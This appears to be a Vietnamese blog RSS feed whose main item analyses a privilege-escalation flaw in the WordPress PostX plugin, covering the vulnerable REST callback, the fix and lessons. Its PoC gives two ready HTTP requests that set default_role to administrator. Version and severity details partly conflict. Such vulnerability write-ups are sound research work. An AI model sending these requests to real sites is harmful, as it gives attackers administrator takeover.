<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Tất Cả Bài Viết - Bui Van Y</title>
    <link>http://localhost:1313/vi/posts/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>vi</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Mon, 05 Jan 2026 19:01:14 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/vi/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-05-cve-2025-55707/</link>
      <pubDate>Mon, 05 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-05-cve-2025-55707/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Gán Quyền Không Chính Xác&lt;/strong&gt; (&lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt;) trong &lt;strong&gt;PostX, Inc. PostX PostX-lite&lt;/strong&gt; cho phép &lt;strong&gt;Leo Thang Đặc Quyền&lt;/strong&gt; (&lt;strong&gt;Privilege Escalation&lt;/strong&gt;). Vấn đề này ảnh hưởng đến &lt;strong&gt;PostX&lt;/strong&gt; từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.35&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;PostX&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.35&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.36&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    &amp;#39;ultp/v1&amp;#39;,&#xA;    &amp;#39;/postx_presets/&amp;#39;,&#xA;    array(&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;  =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; array($this, &amp;#39;postx_presets_callback&amp;#39;),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                return current_user_can(&amp;#39;edit_posts&amp;#39;);&#xA;            },&#xA;            &amp;#39;args&amp;#39; =&amp;gt; array()&#xA;        )&#xA;    )&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với cấu hình trên, API được expose dưới dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi có request gửi đến endpoint này với method POST, WordPress sẽ gọi &lt;code&gt;postx_presets_callback()&lt;/code&gt;. Tuy nhiên, trước khi hàm này được thực thi, request bắt buộc phải vượt qua bước kiểm tra quyền thông qua &lt;code&gt;current_user_can(&#39;edit_posts&#39;)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quyền &lt;code&gt;edit_posts&lt;/code&gt; được cấp cho người dùng có role &lt;strong&gt;Contributor&lt;/strong&gt; trở lên. Trong khi đó, lỗ hổng được công bố lại yêu cầu quyền &lt;strong&gt;Editor&lt;/strong&gt;. Do sự khác biệt này, cần tiếp tục phân tích nội dung của hàm &lt;code&gt;postx_presets_callback()&lt;/code&gt; để xác định nguyên nhân và cách lỗ hổng có thể bị khai thác.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function postx_presets_callback($server) {&#xA;    $post = $server-&amp;gt;get_params();&#xA;    $type = isset($post[&amp;#39;type&amp;#39;]) ? $post[&amp;#39;type&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $key = isset($post[&amp;#39;key&amp;#39;]) ? $post[&amp;#39;key&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $data = isset($post[&amp;#39;data&amp;#39;]) ? $post[&amp;#39;data&amp;#39;] : &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $type ) {&#xA;        if ( $type == &amp;#39;set&amp;#39; ) {&#xA;            if ( current_user_can(&amp;#39;edit_others_posts&amp;#39;) ) {&#xA;                update_option($key, $data);&#xA;            }&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true];&#xA;        } else {&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; get_option($key, [])];&#xA;        }&#xA;    } else {&#xA;        return [&amp;#39;success&amp;#39; =&amp;gt; false];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm callback lấy các tham số &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;key&lt;/code&gt; và &lt;code&gt;data&lt;/code&gt; từ request. Khi &lt;code&gt;type&lt;/code&gt; bằng &lt;code&gt;&#39;set&#39;&lt;/code&gt;, hàm sẽ gọi &lt;code&gt;update_option()&lt;/code&gt; để cập nhật option tương ứng với &lt;code&gt;$key&lt;/code&gt;, với điều kiện người dùng có quyền &lt;code&gt;edit_others_posts&lt;/code&gt; (chỉ dành cho role &lt;strong&gt;Editor&lt;/strong&gt; trở lên). Trong các trường hợp còn lại, hàm trả về giá trị của option thông qua &lt;code&gt;get_option()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Như vậy, có thể thấy rõ lý do lỗ hổng được công bố với yêu cầu quyền &lt;strong&gt;Editor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Một kịch bản phổ biến để khai thác lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; thông qua hàm &lt;code&gt;update_option()&lt;/code&gt; là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;users_can_register = 1&lt;/code&gt; để cho phép người dùng tự đăng ký&lt;/li&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;default_role = administrator&lt;/code&gt; để các tài khoản mới được tạo có quyền Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhiên, do đây là một REST API sử dụng phương thức &lt;strong&gt;POST&lt;/strong&gt;, nên khi được gọi từ trình duyệt, request bắt buộc phải kèm theo nonce. Với các REST request có khả năng thay đổi dữ liệu (POST / PUT / DELETE), WordPress yêu cầu nonce để chống tấn công CSRF. Nếu request không có nonce, WordPress sẽ từ chối với lỗi &lt;code&gt;rest_forbidden&lt;/code&gt;; nếu nonce không hợp lệ, request sẽ bị chặn với lỗi &lt;code&gt;rest_cookie_invalid_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Để lấy được REST API nonce, ta cần đăng nhập vào Admin Dashboard và gọi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt; khi tạo post, vì nonce này chỉ được WordPress inject vào trang khi người dùng đã đăng nhập hợp lệ. Đây là trường hợp đặc biệt, nó được inject vào trang khi tạo post.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;v4.1.36&lt;/strong&gt; đã siết chặt kiểm soát quyền bằng cách thay đổi &lt;code&gt;permission_callback&lt;/code&gt; như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;); // Admins only&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với thay đổi này, chỉ người dùng có quyền &lt;code&gt;manage_options&lt;/code&gt; (role &lt;strong&gt;Administrator&lt;/strong&gt;) mới có thể truy cập endpoint, qua đó ngăn chặn khả năng khai thác lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; từ các role thấp hơn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Editor (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access Admin / Create Post Page&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress injects wpApiSettings.nonce&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Editor obtains REST API nonce&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;POST /wp-json/ultp/v1/postx_presets/&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;X-WP-Nonce validation&amp;#34;]&#xA;&#xA;F -- Invalid --&amp;gt; G[&amp;#34;Request rejected&amp;#34;]&#xA;F -- Valid --&amp;gt; H[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Access denied&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;postx_presets_callback()&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;type == &amp;#39;set&amp;#39;?&amp;#34;}&#xA;K -- No --&amp;gt; L[&amp;#34;get_option()&amp;#34;]&#xA;K -- Yes --&amp;gt; M{&amp;#34;current_user_can(&amp;#39;edit_others_posts&amp;#39;)?&amp;#34;}&#xA;&#xA;M -- No --&amp;gt; N[&amp;#34;Return success without update&amp;#34;]&#xA;M -- Yes --&amp;gt; O[&amp;#34;update_option(key, data)&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Modify sensitive wp_options&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Privilege escalation via default_role / users_can_register&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Dùng Editor account để tạo post&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt; để lấy nonce&lt;/li&gt;&#xA;&lt;li&gt;Gửi request với nonce vừa lấy:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 1&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=users_can_register&amp;amp;data=1&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 2&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=default_role&amp;amp;data=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#34; title=&#34;Default role&#34; data-thumbnail=&#34;/posts/2026-01-05-cve-2025-55707/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Default role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#39; alt=&#34;Result&#34; height=&#34;883&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Default role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Tạo user mới và login&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE-2025-53425 xuất phát từ việc &lt;strong&gt;kết hợp không nhất quán giữa kiểm soát quyền ở mức REST API và logic xử lý trong callback&lt;/strong&gt;. Mặc dù endpoint REST chỉ yêu cầu quyền &lt;code&gt;edit_posts&lt;/code&gt;, nhưng hành vi nguy hiểm nhất (&lt;code&gt;update_option()&lt;/code&gt;) lại được bảo vệ bằng &lt;code&gt;edit_others_posts&lt;/code&gt;, cho phép &lt;strong&gt;Editor&lt;/strong&gt; thực hiện các thay đổi nhạy cảm trong bảng &lt;code&gt;wp_options&lt;/code&gt;. Khi kết hợp với REST API nonce hợp lệ, một Editor có thể lợi dụng endpoint này để thay đổi các option quan trọng, dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;. Bản vá ở phiên bản &lt;code&gt;4.1.36&lt;/code&gt; đã khắc phục triệt để vấn đề bằng cách giới hạn endpoint chỉ cho người dùng có quyền &lt;code&gt;manage_options&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt; phải &lt;strong&gt;phản ánh chính xác mức độ nhạy cảm của hành vi trong callback&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; là hàm &lt;strong&gt;rất nguy hiểm&lt;/strong&gt; nếu không bị giới hạn quyền chặt chẽ&lt;/li&gt;&#xA;&lt;li&gt;REST API nonce &lt;strong&gt;chỉ chống CSRF&lt;/strong&gt;, không thay thế cho kiểm soát phân quyền&lt;/li&gt;&#xA;&lt;li&gt;Editor &lt;strong&gt;không nên&lt;/strong&gt; được phép thay đổi các global option ảnh hưởng đến toàn hệ thống&lt;/li&gt;&#xA;&lt;li&gt;Vá lỗi hiệu quả nhất là &lt;strong&gt;đặt quyền cao ngay từ REST endpoint&lt;/strong&gt;, thay vì kiểm tra rải rác trong callback&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ultimate-post/vulnerability/wordpress-postx-plugin-4-1-35-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin &amp;lt;= 4.1.35 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-04-cve-2025-53425/</link>
      <pubDate>Sun, 04 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-04-cve-2025-53425/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
